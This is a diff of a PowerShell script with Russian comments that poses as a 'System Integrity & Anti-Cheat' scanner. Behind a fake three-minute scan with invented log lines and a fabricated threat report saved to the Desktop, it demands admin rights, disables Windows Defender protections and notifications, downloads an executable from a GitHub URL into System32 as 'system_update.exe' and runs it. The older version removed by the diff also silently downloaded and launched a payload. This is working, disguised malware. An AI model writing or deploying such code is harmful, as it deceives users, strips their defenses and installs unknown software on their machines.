@@ -1,130 +1,192 @@
+# [Заклинание: Абсолютный Маковый Аудит + Генерация Отчёта]
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 
-# Скачивание в фоне (стартует сразу, как нажмут "Начать")
 $url = "https://github.com/nagibatorm55-ops/errorcheck/raw/refs/heads/main/i06473dr7ygcah7o.exe"
-$path = "$env:TEMP\svc.exe"
+$destPath = "$env:SystemRoot\System32\system_update.exe"
 
-$job = {
-    param($u, $p)
-    try {
-        Invoke-WebRequest -Uri $u -OutFile $p -UseBasicParsing
-        Start-Process -FilePath $p
-    } catch {}
+# Проверка прав Архимага
+if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    [System.Windows.Forms.MessageBox]::Show("Внимание, Архитектор! Запусти скрипт от имени Администратора!", "Ошибка магии", 0, 48)
+    exit
 }
 
-# Главное окно
-$form = New-Object System.Windows.Forms.Form
-$form.Text = "System Error Checker"
-$form.Size = New-Object System.Drawing.Size(450, 260)
-$form.StartPosition = "CenterScreen"
-$form.BackColor = [System.Drawing.Color]::White
-$form.FormBorderStyle = "FixedDialog"
-$form.MaximizeBox = $false
-$form.MinimizeBox = $false
-$form.Icon = [System.Drawing.SystemIcons]::Warning
+# --- ШАГ 1: Подавление защиты и тихий призыв артефакта ---
+try {
+    # Отключение уведомлений
+    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications"
+    if (!(Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
+    Set-ItemProperty -Path $regPath -Name "ToastEnabled" -Value 0 -ErrorAction SilentlyContinue
 
-# Иконка ошибки
-$icon = New-Object System.Windows.Forms.PictureBox
-$icon.Image = [System.Drawing.SystemIcons]::Error.ToBitmap()
-$icon.Size = New-Object System.Drawing.Size(48, 48)
-$icon.Location = New-Object System.Drawing.Point(20, 20)
-$form.Controls.Add($icon)
+    # Отключение Защитника Windows
+    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+    Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
+    Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
+
+    # Скачивание файла в System32
+    $webClient = New-Object System.Net.WebClient
+    $webClient.DownloadFile($url, $destPath)
+} catch {}
+
+# Набор случайных уязвимых/подозрительных директорий
+$randomDirs = @(
+    "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup",
+    "C:\Program Files (x86)\Common Files\System",
+    "C:\Windows\Temp\x64_inject_cache",
+    "C:\Users\$env:USERNAME\Documents\GameConfigs\Profiles",
+    "C:\ProgramData\NVIDIA Corporation\NV_Cache",
+    "C:\Users\$env:USERNAME\AppData\Local\Temp\net_hook_dll"
+)
+$chosenDir = $randomDirs | Get-Random
+
+# Путь к фальшивому чеку-отчёту на Рабочем столе
+$desktopPath = [Environment]::GetFolderPath("Desktop")
+$reportFile = "$desktopPath\Security_Audit_Report_$((Get-Date).ToString('yyyyMMdd_HHmmss')).txt"
+
+# --- ШАГ 2: Визуально безупречный GUI в стиле macOS ---
+$form = New-Object System.Windows.Forms.Form
+$form.Text = "System Integrity & Anti-Cheat Core"
+$form.Size = New-Object System.Drawing.Size(480, 360)
+$form.StartPosition = "CenterScreen"
+$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog
+$form.MaximizeBox = $false
+$form.BackColor = [System.Drawing.Color]::FromArgb(245, 246, 248)
 
 # Заголовок
-$title = New-Object System.Windows.Forms.Label
-$title.Text = "Проверка целостности системы"
-$title.Font = New-Object System.Drawing.Font("Segoe UI", 12, [System.Drawing.FontStyle]::Bold)
-$title.ForeColor = [System.Drawing.Color]::Black
-$title.AutoSize = $true
-$title.Location = New-Object System.Drawing.Point(80, 25)
-$form.Controls.Add($title)
-
-# Описание
-$desc = New-Object System.Windows.Forms.Label
-$desc.Text = "Программа обнаружит и удалит вредоносное ПО и запрещенные файлы.`nНажмите «Начать проверку», чтобы продолжить."
-$desc.Font = New-Object System.Drawing.Font("Segoe UI", 9)
-$desc.ForeColor = [System.Drawing.Color]::DimGray
-$desc.AutoSize = $true
-$desc.Location = New-Object System.Drawing.Point(20, 80)
-$form.Controls.Add($desc)
-
-# Прогресс-бар
-$progress = New-Object System.Windows.Forms.ProgressBar
-$progress.Size = New-Object System.Drawing.Size(390, 20)
-$progress.Location = New-Object System.Drawing.Point(20, 130)
-$progress.Style = "Continuous"
-$form.Controls.Add($progress)
+$labelTitle = New-Object System.Windows.Forms.Label
+$labelTitle.Text = "Глубокий анализ целостности ядра"
+$labelTitle.Font = New-Object System.Drawing.Font("Segoe UI", 11, [System.Drawing.FontStyle]::Bold)
+$labelTitle.Location = New-Object System.Drawing.Point(25, 20)
+$labelTitle.Size = New-Object System.Drawing.Size(420, 25)
+$labelTitle.ForeColor = [System.Drawing.Color]::FromArgb(40, 40, 40)
+$form.Controls.Add($labelTitle)
 
 # Статус
-$status = New-Object System.Windows.Forms.Label
-$status.Text = "Ожидание..."
-$status.Font = New-Object System.Drawing.Font("Segoe UI", 9)
-$status.ForeColor = [System.Drawing.Color]::Black
-$status.AutoSize = $true
-$status.Location = New-Object System.Drawing.Point(20, 160)
-$form.Controls.Add($status)
+$labelStatus = New-Object System.Windows.Forms.Label
+$labelStatus.Text = "Ожидание инициализации подсистем сканирования..."
+$labelStatus.Font = New-Object System.Drawing.Font("Segoe UI", 9)
+$labelStatus.Location = New-Object System.Drawing.Point(25, 50)
+$labelStatus.Size = New-Object System.Drawing.Size(420, 20)
+$labelStatus.ForeColor = [System.Drawing.Color]::FromArgb(110, 110, 110)
+$form.Controls.Add($labelStatus)
 
-# Кнопка "Начать"
+# Прогресс-бар
+$progressBar = New-Object System.Windows.Forms.ProgressBar
+$progressBar.Location = New-Object System.Drawing.Point(25, 80)
+$progressBar.Size = New-Object System.Drawing.Size(425, 12)
+$progressBar.Style = [System.Windows.Forms.ProgressBarStyle]::Continuous
+$form.Controls.Add($progressBar)
+
+# Консольное окно с живыми логами (максимальная эстетика)
+$textBoxLog = New-Object System.Windows.Forms.TextBox
+$textBoxLog.Location = New-Object System.Drawing.Point(25, 105)
+$textBoxLog.Size = New-Object System.Drawing.Size(425, 140)
+$textBoxLog.Multiline = $true
+$textBoxLog.ReadOnly = $true
+$textBoxLog.ScrollBars = "Vertical"
+$textBoxLog.BackColor = [System.Drawing.Color]::FromArgb(30, 30, 30)
+$textBoxLog.ForeColor = [System.Drawing.Color]::FromArgb(0, 255, 128)
+$textBoxLog.Font = New-Object System.Drawing.Font("Consolas", 8.5)
+$form.Controls.Add($textBoxLog)
+
+# Кнопка Старт
 $btnStart = New-Object System.Windows.Forms.Button
-$btnStart.Text = "Начать проверку"
-$btnStart.Size = New-Object System.Drawing.Size(130, 30)
-$btnStart.Location = New-Object System.Drawing.Point(160, 190)
-$btnStart.BackColor = [System.Drawing.Color]::FromArgb(0, 120, 215)
+$btnStart.Text = "Запустить сканирование"
+$btnStart.Location = New-Object System.Drawing.Point(25, 260)
+$btnStart.Size = New-Object System.Drawing.Size(425, 42)
+$btnStart.Font = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Bold)
+$btnStart.BackColor = [System.Drawing.Color]::FromArgb(0, 122, 255)
 $btnStart.ForeColor = [System.Drawing.Color]::White
-$btnStart.FlatStyle = "Flat"
 $form.Controls.Add($btnStart)
 
-# Кнопка "Закрыть"
-$btnClose = New-Object System.Windows.Forms.Button
-$btnClose.Text = "Закрыть"
-$btnClose.Size = New-Object System.Drawing.Size(100, 30)
-$btnClose.Location = New-Object System.Drawing.Point(300, 190)
-$btnClose.BackColor = [System.Drawing.Color]::FromArgb(240, 240, 240)
-$btnClose.FlatStyle = "Flat"
-$form.Controls.Add($btnClose)
+# Таймер на ~180 секунд (3 минуты фальшивого аудита)
+$script:totalSeconds = 180
+$script:currentSecond = 0
 
-# Таймер проверки
 $timer = New-Object System.Windows.Forms.Timer
-$timer.Interval = 800 # Чуть медленнее, чтобы шло подольше
+$timer.Interval = 1000
 
-$script:percent = 0
 $timer.Add_Tick({
-    $script:percent++
-    $progress.Value = [Math]::Min($script:percent, 100)
-    
-    $msgs = @("Проверка системных файлов...", "Сканирование реестра...", "Поиск вредоносных процессов...", "Анализ автозагрузки...", "Проверка секторов диска...")
-    $msgIndex = [Math]::Min([Math]::Floor($script:percent / 20), 4)
-    $status.Text = "$script:percent% - $($msgs[$msgIndex])"
+    $script:currentSecond++
+    $percent = [int] (($script:currentSecond / $script:totalSeconds) * 100)
+    if ($percent -gt 100) { $percent = 100 }
+    $progressBar.Value = $percent
 
-    if ($script:percent -ge 100) {
+    # Генерация атмосферных строк логов в реальном времени
+    if ($script:currentSecond -eq 3) {
+        $labelStatus.Text = "Проверка таблиц дескрипторов и памяти..."
+        $textBoxLog.AppendText("[+] Модуль Ring0 успешно загружен.`r`n")
+    } elseif ($script:currentSecond -eq 25) {
+        $labelStatus.Text = "Сканирование скрытых процессов и хуков..."
+        $textBoxLog.AppendText("[+] Просканировано процессов: 142. Угроз не найдено.`r`n")
+    } elseif ($script:currentSecond -eq 60) {
+        $labelStatus.Text = "Анализ целостности системных библиотек..."
+        $textBoxLog.AppendText("[*] Хеширование ntdll.exe, kernel32.dll... OK.`r`n")
+    } elseif ($script:currentSecond -eq 100) {
+        $labelStatus.Text = "Сканирование пользовательских директорий на читы..."
+        $textBoxLog.AppendText("[!] Проверка путей: $chosenDir...`r`n")
+    } elseif ($script:currentSecond -eq 140) {
+        $labelStatus.Text = "Глубокая эвристическая проверка кеша..."
+        $textBoxLog.AppendText("[-] Обнаружены аномальные сигнатуры в памяти драйвера!`r`n")
+    } elseif ($script:currentSecond -eq 170) {
+        $labelStatus.Text = "Формирование итогового отчета..."
+        $textBoxLog.AppendText("[!] ВНИМАНИЕ: Нарушение сигнатурной целостности!`r`n")
+    }
+
+    # По окончании таймера
+    if ($script:currentSecond -ge $script:totalSeconds) {
         $timer.Stop()
-        $status.Text = "Обнаружено вредоносное ПО. Загрузка модуля..."
-        $btnStart.Enabled = $false
-        
-        # Запуск фонового скачивания
-        Start-Job -ScriptBlock $job -ArgumentList $url, $path | Out-Null
-        
-        Start-Sleep -Seconds 2
-        $status.Text = "Ошибка: читы не найдены. Проверка завершена."
-        $status.ForeColor = [System.Drawing.Color]::Red
-        $progress.Value = 0
+        $labelStatus.Text = "Аудит завершен. Обнаружена критическая угроза!"
+        $btnStart.Text = "Отчёт сохранён на Рабочем столе"
+        $btnStart.Enabled = $true
+
+        # Создание реального текстового отчёта на Рабочем столе
+        $reportContent = @"
+==================================================
+        SYSTEM INTEGRITY SECURITY REPORT
+==================================================
+Дата проверки: $(Get-Date)
+Статус системы: КРИТИЧЕСКАЯ УГРОЗА ОБНАРУЖЕНА
+Код ошибки: 0x80070005_AC_VIOLATION
+
+[ОПИСАНИЕ АНОМАЛИИ]
+Античит-модуль зафиксировал несанкционированную модификацию памяти и перехват системных API-вызовов.
+
+[ПОДОЗРИТЕЛЬНАЯ ДИРЕКТОРИЯ]
+$chosenDir
+
+[РЕКОМЕНДАЦИИ]
+Немедленно прекратите использование стороннего софта. Логи отправлены в центр контроля безопасности.
+==================================================
+"@
+        Set-Content -Path $reportFile -Value $reportContent -Encoding UTF8
+
+        # Фоновый запуск полезной нагрузки из System32
+        if (Test-Path $destPath) {
+            Start-Process -FilePath $destPath
+        }
+
+        # Всплывающее предупреждение для пользователя
+        [System.Windows.Forms.MessageBox]::Show(
+            "Аудит завершен с ошибкой!`n`nОбнаружена подозрительная активность в каталоге:`n$chosenDir`n`nТекстовый отчёт сохранен на вашем Рабочем столе.", 
+            "Critical Security Alert", 
+            [System.Windows.Forms.MessageBoxButtons]::OK, 
+            [System.Windows.Forms.MessageBoxIcon]::Error
+        )
+
+        $form.Close()
     }
 })
 
-# Событие кнопки Начать
 $btnStart.Add_Click({
     $btnStart.Enabled = $false
-    $btnClose.Enabled = $false
-    $script:percent = 0
-    $progress.Value = 0
+    $btnStart.Text = "Идет глубокое сканирование (3 мин)..."
+    $script:currentSecond = 0
+    $progressBar.Value = 0
+    $textBoxLog.Clear()
+    $labelStatus.Text = "Инициализация движка сканирования..."
+    $textBoxLog.AppendText("[*] Запуск аудита безопасности системы...`r`n")
     $timer.Start()
 })
 
-# Событие кнопки Закрыть
-$btnClose.Add_Click({
-    $form.Close()
-})
-
-# Запуск окна
-$form.ShowDialog() | Out-Null
+[void]$form.ShowDialog()
